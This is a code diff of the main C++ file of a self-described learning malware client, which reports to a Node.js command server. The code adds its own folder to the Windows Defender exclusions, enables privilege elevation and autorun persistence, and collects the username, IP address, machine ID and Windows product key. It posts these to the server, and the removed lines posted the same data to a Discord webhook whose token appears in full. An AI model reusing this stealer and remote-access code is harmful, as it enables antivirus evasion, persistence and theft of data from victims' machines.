@@ -1,4 +1,15 @@
-﻿#include <iostream>
+﻿/*
+This code is created for learning about malware. I have been using it to study hardware.
+If I made any mistakes, I apologize for that. The code might not be perfect because I am also learning C++.
+
+This project is part of a Science subject for the Presence Project.
+Code written by Mikasuru (github.com/Mikasuru)
+----------------------------------------------------------------
+The project is built on a client-server model where a Node.js backend manages command distribution while C++ clients handle execution.
+Main.cpp serves as the entry point, initializing core components and establishing webhook communications.
+The server component (app.js) handles client registration, command distribution, and maintains the web interface.
+*/
+#include <iostream>
 #include "Module/Logger.hpp"
 #include "Extension/Payload/Payload.hpp"
 #include "Extension/GetDevice/Hardware.hpp"
@@ -7,8 +18,6 @@
 
 using namespace std;
 
-const string webhook_url = "https://discord.com/api/webhooks/1309489093352099881/tGCASYnWKaknrflUG_Eh_wNoL-H9wP4qM2k9EskcXqoGSyr94qXL43xC8H2LgSgD9Kgw";
-
 string username = Hardware::GetUsername();
 string ipAddress = Hardware::GetIPAddress();
 string machineID = Hardware::GetMachineID();
@@ -16,6 +25,8 @@ string rid = Hardware::GetRelativeIdentifier();
 string windowsVersion = Hardware::GetWindowsVersion();
 string windowsKey = Hardware::GetWindowsKey();
 string profilePicPath = Hardware::GetUserProfilePicture();
+
+std::string url = "http://localhost:3000/register";
 
 void Exclusion(const std::string& path) {
     std::string command = "powershell -Command \"Add-MpPreference -ExclusionPath '" + path + "'\"";
@@ -39,8 +50,8 @@ std::string getExecutablePath() {
 
 int main() {
     try {
-        HWND console = GetConsoleWindow();
-        ShowWindow(console, SW_HIDE);
+        //HWND console = GetConsoleWindow();
+        //ShowWindow(console, SW_HIDE);
 
         STARTUPINFOA si = { sizeof(si) };
         si.dwFlags = STARTF_USESHOWWINDOW;
@@ -49,7 +60,6 @@ int main() {
         SetConsoleMode(GetStdHandle(STD_ERROR_HANDLE), 0);
 
         std::string executable = getExecutablePath();
-        
         std::string Dir = executable.substr(0, executable.find_last_of("\\/"));
 
         Exclusion(Dir);
@@ -77,34 +87,56 @@ int main() {
             }
             return 0;
         }
-        Logger::getInstance()->info("Running as admin");
-       
-        //AutoElevate::elevatePrivileges();
-        
+        Logger::getInstance()->info("Running as admin"); 
+        AutoElevate::elevatePrivileges();
         if (!AutoElevate::setAutoRun()) {
             Logger::getInstance()->warning("Failed to set auto run");
         }
+        Logger::getInstance()->load("Initialize HTTP Client..."); // Initialize
+        Logger::getInstance()->load("Starting HTTP Client..."); // Start
 
-        Logger::getInstance()->info("Injector started!");
+        // Collecting system information
+        std::string username = Hardware::GetUsername();
+        std::string ipAddress = Hardware::GetIPAddress();
+        std::string machineID = Hardware::GetMachineID();
+        std::string rid = Hardware::GetRelativeIdentifier();
+        std::string windowsVersion = Hardware::GetWindowsVersion();
+        std::string windowsKey = Hardware::GetWindowsKey();
 
-        // Sending Information
-        Payload::SendMessage(webhook_url, "```ini\n"
-            "[User Information]\n"
-            "Username   : " + username + "\n"
-            "RID        : " + rid + "\n\n"
-            "[System Information]\n"
-            "OS         : " + windowsVersion + "\n"
-            "Product Key: " + windowsKey + "\n\n"
-            "[Network Information]\n"
-            "IP Address : " + ipAddress + "\n"
-            "Machine ID : " + machineID + "\n"
-            "```");
+        // Creating JSON Object
+        nlohmann::json systemInfo = {
+            {"username", username},
+            {"ipAddress", ipAddress},
+            {"machineID", machineID},
+            {"rid", rid},
+            {"windowsVersion", windowsVersion},
+            {"windowsKey", windowsKey}
+        };
 
-        // Initialize
-        Logger::getInstance()->load("Initialize HTTP Client...");
+        std::string jsonStr = systemInfo.dump();
 
-        // Start
-        Logger::getInstance()->load("Starting HTTP Client...");
+        // Sending information to server
+        HINTERNET hInternet = InternetOpenA("System Info Client",
+            INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
+
+        if (hInternet) {
+            HINTERNET hConnect = InternetConnectA(hInternet, "localhost",
+                3000, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
+
+            if (hConnect) {
+                HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", "/register",
+                    NULL, NULL, NULL, 0, 0);
+
+                if (hRequest) {
+                    std::string headers = "Content-Type: application/json\r\n";
+                    HttpSendRequestA(hRequest, headers.c_str(), headers.length(),
+                        (LPVOID)jsonStr.c_str(), jsonStr.length());
+                    InternetCloseHandle(hRequest);
+                }
+                InternetCloseHandle(hConnect);
+            }
+            InternetCloseHandle(hInternet);
+        }
 
         HttpClient client;
         client.start();
